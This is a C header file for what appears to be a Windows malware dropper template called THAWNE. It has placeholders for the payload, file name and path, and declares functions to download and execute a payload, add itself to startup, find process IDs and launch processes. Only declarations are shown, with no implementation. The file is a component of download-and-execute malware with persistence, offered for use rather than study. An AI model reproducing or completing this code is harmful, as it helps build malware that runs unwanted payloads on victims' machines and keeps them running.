/* 

Have a good time reading the source. You are an amazing person.


*/

#ifndef THAWNE
#define THAWNE

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Do not change.
#define PAYLOAD "{payload}"
#define FILENAME "{filename}"
#define FILEPATH "{path}"

#define UNLEN 256

void DownloadExecute();
void AddToStartup();
DWORD ProcessId(LPCTSTR ProcessName);
BOOL isFile(char* file);
void StartProcess(char* filename);

#endif